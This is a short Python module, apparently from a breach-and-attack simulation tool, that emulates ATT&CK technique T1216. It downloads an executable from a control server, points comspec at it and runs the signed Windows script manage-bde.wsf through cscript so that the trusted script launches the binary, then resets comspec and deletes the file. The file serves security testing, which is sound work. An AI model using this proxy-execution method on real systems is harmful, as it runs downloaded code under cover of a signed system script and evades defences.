import os

from infection_monkey.control import ControlClient
from infection_monkey.utils.environment import is_windows_os

TEMP_COMSPEC = os.path.join(os.getcwd(), "T1216_random_executable.exe")


def get_windows_commands_to_proxy_execution_using_signed_script():
    signed_script = ""

    if is_windows_os():
        _download_random_executable()
        windir_path = os.environ["WINDIR"]
        signed_script = os.path.join(windir_path, "System32", "manage-bde.wsf")

    return [f"set comspec={TEMP_COMSPEC} &&", f"cscript {signed_script}"]


def _download_random_executable():
    download = ControlClient.get_T1216_pba_file()
    with open(TEMP_COMSPEC, "wb") as random_exe_obj:
        random_exe_obj.write(download.content)
        random_exe_obj.flush()


def get_windows_commands_to_reset_comspec(original_comspec):
    return f"set comspec={original_comspec}"


def get_windows_commands_to_delete_temp_comspec():
    return f"del {TEMP_COMSPEC} /f"
